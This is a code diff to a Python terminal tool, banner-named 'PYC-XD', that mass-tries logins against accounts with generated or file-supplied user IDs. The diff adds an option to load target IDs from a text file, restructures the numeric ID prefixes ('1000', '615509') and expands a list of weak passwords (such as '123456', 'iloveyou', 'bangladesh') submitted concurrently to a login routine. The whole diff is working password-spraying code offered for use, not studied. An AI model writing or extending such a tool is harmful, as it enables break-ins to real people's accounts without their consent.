@@ -92,6 +92,7 @@ def old():
     sort.logo()
     print("[b]    [red1][A] [sea_green2]Crack 10001-10009 Id")
     print("[b]    [red1][B] [spring_green1]Crack 61550 Id")
+    print("[b]    [red1][C] [spring_green1] File UID crack")
     print(sort.line())
     ask = input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m ")
 
@@ -101,21 +102,32 @@ def old():
         print("[b]     [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
         limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
         print(sort.line())
-        star = "1000"
+
         for i in range(limit):
             data = str(random.choice(range(50000000000, 99999999999)))
             user.append(data)
-    else:
-        star = "615509"
+    elif ask in ["b", "B", "2", "02"]:
+
         print(" [b]    [red1]✗ [chartreuse1]Selected  [orange3]▶  [chartreuse1]Uid 61550")
         print(sort.line())
         print("  [b]   [red1]✗ [chartreuse1]Example   [orange3]▶  [chartreuse1]100000, 200000")
         limit = int(input("\x1b[38;1;196m\x1b[38;5;196m     ✗ \x1b[38;5;198mChoice   \x1b[38;5;208m ▶ \x1b[38;0;196m "))
         print(sort.line())
-
         for i in range(limit):
             data = str(random.choice(range(10000000, 99999999)))
             user.append(data)
+    elif ask in ["c", "C", "3", "03"]:
+        print("[b] [chartreuse1]TYPE YOUR FILE PATH EXAMPLE      [b deep_pink2]->[/b deep_pink2]  [chartreuse1] "
+              "/sdcard/id.txt")
+        path = str(input(" \x1b[38;1;198m  \x1b[38;5;155mCHOICE      \x1b[38;5;196m-> \x1b[1;97m   "))
+        print(sort.line())
+        try:
+            with open(path, "r") as file:
+                fl = file.read().splitlines()
+        except Exception as e:
+            print("Error:", e)
+            old()
+
     print("[b]    [red1][1] [sea_green2]Method A")
     print("[b]    [red1][2] [spring_green1]Method B")
     print(sort.line())
@@ -127,9 +139,22 @@ def old():
         print(" [b]    [red1]✗ [chartreuse1]Total Uid [orange3]▶  [chartreuse1]" + str(len(user)))
         print(" [b]    [red1]✗ [light_green]Login Ids [orange3]▶  [light_green]Just Now")
         print(sort.line())
-        for mal in user:
-            uid = star + mal
-            heron.submit(login, uid, meth)
+
+        if ask in ["1", "01", "a", "A"]:
+            star = "1000"
+            for mal in user:
+                uid = star + mal
+                heron.submit(login, uid, meth)
+        elif ask in ["b", "B", "2", "02"]:
+            star = "615509"
+            for mal in user:
+                uid = star + mal
+                heron.submit(login, uid, meth)
+        else:
+            for mal in fl:
+                uid = mal.split("|")[0]
+                user.append(uid)
+                heron.submit(login, uid, meth)
 
 
 def login(uid, meth):
@@ -139,7 +164,7 @@ def login(uid, meth):
         sys.stdout.write(
             f"\r  \x1b[38;1;196m  \x1b[38;0;196m└\033[38;5;46m[{sort.color()}PYC-XD\033[38;5;46m]~[\x1b[1;97m{loop}-M{meth}\033[38;5;46m]-[\x1b[1;90mOK:{str(len(oks))}\033[38;5;46m] \r")
         sys.stdout.flush()
-        for pw in ["123456", "1234567", "12345678", "123456789", "password", "654321", "@#@#@#"]:
+        for pw in ["123456", "12345678", "password", "654321", "@#@#@#", "@#@#@#@#", "@@@###", "@@@@####", "iloveyou", "sadiya", "jannat", "bangladesh", "১২৩৪৫৬", "77889900"]:
             if meth in ["1", "01", "A", "a"]:
                 agent = uaxxxx()
             else:
